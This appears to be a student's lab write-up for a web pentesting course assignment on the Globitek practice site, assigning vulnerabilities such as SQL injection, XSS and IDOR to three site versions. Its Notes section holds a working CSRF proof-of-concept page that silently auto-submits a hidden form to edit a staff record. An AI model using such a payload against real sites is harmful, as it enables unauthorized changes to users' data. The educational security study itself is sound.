# Project 8 - Pentesting Live Targets

Time spent: 10 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection (SQLi)
[Week8_SQLI](http://i.imgur.com/iBXaxoC.gif?1)

Vulnerability #2: Session Hijacking/Fixation
http://i.imgur.com/vnp6gR0.gif

## Green

Vulnerability #1: Username Enumeration
http://i.imgur.com/xeWJxW2.gif

Vulnerability #2: Cross-Site Scripting
http://i.imgur.com/LGyb6Cw.gif

## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)
http://i.imgur.com/HhqdV19.gif

Vulnerability #2: Cross-Site Request Forgery

This one, I used postman to fire the POST request. After logging in as admin, I fired the POST request with the body of the following(see notes), however, I didn't see salespeople(id=7)'s info got editted. 


## Notes
<html> 
  <body onload="document.csrf.submit()">
    <form action="https://35.184.197.255/red/public/staff/salespeople/edit.php?id=7" method="POST" name="csrf" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Hacker"><br>
      <input type="text" name="last_name" value="Hacker"><br>
      <input type="text" name="phone" value="999-999-9999"><br>
      <input type="text" name="email" value="hacker@hacker.com"><br>
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>



